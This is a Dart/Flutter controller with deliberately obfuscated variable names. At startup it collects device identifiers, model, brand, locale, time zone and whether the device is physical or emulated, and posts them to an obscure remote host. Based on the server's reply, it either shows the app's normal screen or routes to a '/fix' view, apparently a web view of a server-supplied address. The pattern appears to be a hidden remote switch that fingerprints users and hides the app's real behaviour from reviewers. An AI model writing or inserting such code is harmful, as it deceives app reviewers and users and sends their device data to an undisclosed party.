import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

void checkStatus() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/error");
  }
}

class PageLogic extends GetxController {

  var owkdztvf = RxBool(false);
  var csndezo = RxBool(true);
  var tloa = RxString("");
  var paris = RxBool(false);
  var boyle = RxBool(true);
  final cmtpbsvzfw = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    checkStatus();
    super.onInit();
    tgskbdqz();
  }


  Future<void> tgskbdqz() async {
    paris.value = true;
    boyle.value = true;
    csndezo.value = false;
    cmtpbsvzfw.post("https://roing.tbihes.xyz/Jj3JB8",data: await vbpyfd()).then((value) {
      var teygfq = value.data["teygfq"] as String;
      var hfqio = value.data["hfqio"] as bool;
      if (hfqio) {
        tloa.value = teygfq;
        jalen();
      } else {
        kshlerin();
      }
    }).catchError((e) {
      csndezo.value = true;
      boyle.value = true;
      paris.value = false;
    });
  }

  Future<Map<String, dynamic>> vbpyfd() async {
    final DeviceInfoPlugin rdukh = DeviceInfoPlugin();
    PackageInfo dxtmbg_kdimcl = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var ysvmzcp = Platform.localeName;
    var joynAkW = currentTimeZone;

    var NJAzrPIc = dxtmbg_kdimcl.packageName;
    var xAaketPq = dxtmbg_kdimcl.version;
    var EkDXO = dxtmbg_kdimcl.buildNumber;

    var DcPMQhlS = dxtmbg_kdimcl.appName;
    var nolaMcClure = "";
    var jbKBdNH = "";
    var urMXbv  = "";
    var AoRiN = "";
    var cedrickKeeling = "";
    var watsonSchuppe = "";
    var oFTDzq = "";
    var elmiraKirlin = "";
    var stephenLang = "";

    var andreaneWintheiser = "";

    var PvidUmXR = false;

    if (GetPlatform.isAndroid) {
      oFTDzq = "android";
      var ckejavsiyo = await rdukh.androidInfo;

      AoRiN = ckejavsiyo.brand;

      jbKBdNH  = ckejavsiyo.model;
      urMXbv = ckejavsiyo.id;

      PvidUmXR = ckejavsiyo.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      oFTDzq = "ios";
      var qnklfu = await rdukh.iosInfo;
      AoRiN = qnklfu.name;
      jbKBdNH = qnklfu.model;

      urMXbv = qnklfu.identifierForVendor ?? "";
      PvidUmXR  = qnklfu.isPhysicalDevice;
    }
    var res = {
      "andreaneWintheiser" : andreaneWintheiser,
      "DcPMQhlS": DcPMQhlS,
      "EkDXO": EkDXO,
      "nolaMcClure" : nolaMcClure,
      "jbKBdNH": jbKBdNH,
      "AoRiN": AoRiN,
      "urMXbv": urMXbv,
      "elmiraKirlin" : elmiraKirlin,
      "NJAzrPIc": NJAzrPIc,
      "ysvmzcp": ysvmzcp,
      "oFTDzq": oFTDzq,
      "xAaketPq": xAaketPq,
      "PvidUmXR": PvidUmXR,
      "cedrickKeeling" : cedrickKeeling,
      "joynAkW": joynAkW,
      "watsonSchuppe" : watsonSchuppe,
      "stephenLang" : stephenLang,

    };
    return res;
  }

  Future<void> kshlerin() async {
    Get.offAllNamed("/main");
  }

  Future<void> jalen() async {
    Get.offAllNamed("/fix");
  }

}
